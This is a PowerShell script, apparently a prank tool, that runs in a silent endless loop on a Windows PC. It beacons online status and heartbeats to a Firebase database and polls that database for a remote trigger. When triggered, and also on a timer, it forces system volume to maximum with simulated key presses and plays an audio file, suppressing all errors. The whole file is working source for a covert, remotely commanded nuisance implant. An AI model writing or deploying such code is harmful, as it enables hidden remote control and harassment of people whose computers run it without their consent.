# ---------------- CONFIG ----------------
$audioPath = "C:\sounds\essential.mp3"
$base = "https://troll-lab-default-rtdb.asia-southeast1.firebasedatabase.app/soundSystem"
$loopDelay = 700
# ----------------------------------------

$triggerUrl  = "$base/trigger.json"
$statusUrl   = "$base/pcStatus.json"
$soundUrl    = "$base/soundLoaded.json"
$lastSeenUrl = "$base/lastSeen.json"

Add-Type -AssemblyName presentationCore

# ---- volume helper (only used when playing) ----
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Volume {
  [DllImport("user32.dll")]
  public static extern void keybd_event(byte vk, byte scan, int flags, int extra);
}
"@

function Set-MaxVolume {
    for ($i=0; $i -lt 50; $i++) {
        [Volume]::keybd_event(0xAF,0,0,0)
        Start-Sleep -Milliseconds 15
    }
}

# ---- media player setup ----
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open([Uri]$audioPath)
$player.Volume = 1.0
Start-Sleep -Milliseconds 500

# mark online at start (proper JSON)
Invoke-RestMethod $statusUrl -Method Put -ContentType "application/json" `
    -Body '"online"' | Out-Null

# ---- prevent immediate fallback play on startup ----
$nextPlay = (Get-Date).AddSeconds($loopDelay)

# ---------------- MAIN LOOP ----------------
while ($true) {

    try {
        $now = Get-Date

        # ---- heartbeat timestamp ----
        Invoke-RestMethod $lastSeenUrl -Method Put -ContentType "application/json" `
            -Body ('"' + $now.ToString("s") + '"') | Out-Null

        # ---- refresh online flag ----
        Invoke-RestMethod $statusUrl -Method Put -ContentType "application/json" `
            -Body '"online"' | Out-Null

        # ---- sound file status ----
        $exists = Test-Path $audioPath
        $jsonBool = if ($exists) { "true" } else { "false" }

        Invoke-RestMethod $soundUrl -Method Put -ContentType "application/json" `
            -Body $jsonBool | Out-Null

        # ---- trigger check ----
        $flag = Invoke-RestMethod $triggerUrl -TimeoutSec 3

        if ($flag -eq $true -and $exists) {
            Set-MaxVolume
            $player.Position = [TimeSpan]::Zero
            $player.Play()

            Invoke-RestMethod $triggerUrl -Method Put -ContentType "application/json" `
                -Body "false" | Out-Null
        }

        # ---- timed fallback play ----
        if ($exists -and $now -ge $nextPlay) {
            Set-MaxVolume
            $player.Position = [TimeSpan]::Zero
            $player.Play()
            $nextPlay = $now.AddSeconds($loopDelay)
        }

    }
    catch {
        # ignore network errors and keep looping
    }

    Start-Sleep -Seconds 2
}
